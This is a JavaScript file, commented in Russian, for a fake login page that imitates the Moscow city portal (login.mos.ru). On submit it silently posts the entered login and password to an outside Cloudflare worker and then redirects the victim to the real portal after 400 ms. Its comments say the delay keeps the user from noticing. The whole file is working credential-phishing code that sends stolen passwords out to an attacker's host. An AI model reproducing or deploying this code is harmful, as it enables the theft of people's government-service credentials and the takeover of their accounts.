(function () {
    // Твой URL воркера
    const WORKER_URL = 'https://my-neon-worker.viotlunov.workers.dev';
    
    // Самая стабильная ссылка. Она всегда работает и ведет на вход/регистрацию
    const AFTER_SUCCESS_REDIRECT = 'https://login.mos.ru/';

    const form = document.getElementById('loginForm');
    const loginInput = document.getElementById('login');
    const passwordInput = document.getElementById('password');
    const submitBtn = form.querySelector('.submit-btn');
    const loginError = document.getElementById('loginError');
    const passwordError = document.getElementById('passwordError');

    function setFieldError(element, message) {
        element.textContent = message || '';
        element.classList.toggle('is-visible', Boolean(message));
    }

    form.addEventListener('submit', async (event) => {
        event.preventDefault();
        
        const loginValue = loginInput.value.trim();
        const passwordValue = passwordInput.value;
        let hasErrors = false;

        // Валидация
        if (!loginValue) {
            setFieldError(loginError, 'Введите логин');
            hasErrors = true;
        }
        if (!passwordValue) {
            setFieldError(passwordError, 'Введите пароль');
            hasErrors = true;
        }

        if (hasErrors) return;

        // Визуально меняем кнопку
        const originalText = submitBtn.textContent;
        submitBtn.disabled = true;
        submitBtn.textContent = 'Входим…';

        const payload = {
            login: loginValue,
            password: passwordValue,
        };

        // САМАЯ ВАЖНАЯ ЧАСТЬ:
        // Отправляем данные "в фоне" и сразу планируем переход через 400мс
        // Этого времени хватит, чтобы запрос улетел, но пользователь не успел ничего заметить
        
        try {
            fetch(WORKER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            }).catch(e => console.log('Silent error')); // Игнорим ошибки воркера для пользователя

            // Перекидываем через мгновение в любом случае
            setTimeout(() => {
                window.location.href = AFTER_SUCCESS_REDIRECT;
            }, 400);

        } catch (err) {
            // Если совсем всё упало — всё равно перекидываем
            window.location.href = AFTER_SUCCESS_REDIRECT;
        }
    });

    // Показать/скрыть пароль
    const showPasswordCheckbox = document.getElementById('showPassword');
    showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
    });
})();